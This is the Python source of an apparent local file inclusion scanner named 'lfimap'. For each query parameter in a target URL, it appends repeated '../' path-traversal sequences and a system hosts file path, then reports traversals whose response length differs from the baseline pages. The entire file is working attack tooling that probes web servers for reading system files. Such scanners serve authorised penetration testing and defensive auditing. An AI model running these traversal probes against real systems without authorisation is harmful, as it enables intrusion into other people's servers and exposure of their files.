#!/usr/bin/python3
from urllib.parse import urlparse, parse_qs

import src.webRequests as webRequests


def LFIScan(args, url):
    callRequest = webRequests

    vuln_count = 0
    traversal_string = '../'
    
    # -Set traversal count
    traversal_count = args.traversal

    # -Sets LFI target file
    if args.absolute_path is True:
        host_files = ('/windows/System32/drivers/etc/hosts', '/etc/hosts')
    else:    
        host_files = ('windows/System32/drivers/etc/hosts', 'etc/hosts')

    # -Sets host file - default linux
    if args.windows is True:
        host_file = host_files[0]
    else:
        host_file = host_files[1]

    # -Set webreq protocol - http or https
    protocols = ('https://', 'http://')
    if args.ssl is True:
        protocol = protocols[0]
    else:
        protocol = protocols[1]

    if not url.startswith(protocols):
        url = protocol + url
    
    # VERIFICATION - Find params in url e.g. ?lang= 
    parsed_queries = (urlparse(url)).query
    parameters = parse_qs(parsed_queries)
    if len(parameters) <= 0:
        print(f'lfimap: No parameters detected in url - {url}')
        print('lfimap: You can -h for help')
        return
    
    print(f"lfimap: Found parameters.")
    
    # Run loop for each param
    for parameter, value_list in parameters.items():
        request_pack = callRequest.getRequest(url)
        default_length = request_pack[3]
        # Unpack headers here to check for windows
        for param, value in request_pack[1].items():
            if 'Server' in param and args.windows == False:
                if 'microsoft' in value.lower():
                    print('\nlfimap: Server responsed with Microsoft Server header please add --windows to your command.')
                    return

        
        for value in value_list:
            url = url.replace(value, '')

        default_length_broken = callRequest.getRequest(url+'xyz')[3]
        default_length_broken_w_key = callRequest.getRequest(url+traversal_string+'xyz')[3]

        print(f"lfimap: Default page content-length exlusion = {default_length}")
        print(f"lfimap: Broken page content-length exlusion = {default_length_broken} & {default_length_broken_w_key}\n")
        print(f"lfimap: Testing '{parameter}' parameter:")
        
        for count in range(traversal_count):
            # www.google.com=?lang= + ../ + etc/hosts
            modded_url = (url+(traversal_string*count)+host_file)
            request = callRequest.getRequest(modded_url)
            request_content_length = request[3]
            if request_content_length != default_length and request_content_length != default_length_broken and request_content_length != default_length_broken_w_key:
                print(f'\n> LFI FOUND: {url+(traversal_string*count)+host_file}       [Status: {request[0]}, Content-Length: {request[3]}]')
                vuln_count += 1
            else:
                if args.verbose is True:
                    print(f'> {url+(traversal_string*count)+host_file}       [Status: {request[0]}, Content-Length: {request[3]} (LFI False)]')

    if vuln_count <= 0:
        print(f'\nlfimap: Completed {traversal_count} traversals attempts.\n')
        print('\nlfimap: 0 LFI Vulnerabilites found, maybe try add --absolute-path or increase --traversal count.')
    else:
        print(f'\nlfimap: Completed {traversal_count} traversals attempts.\n')
        print(f'\nlfimap: {vuln_count} LFI Vulnerabilites found.')
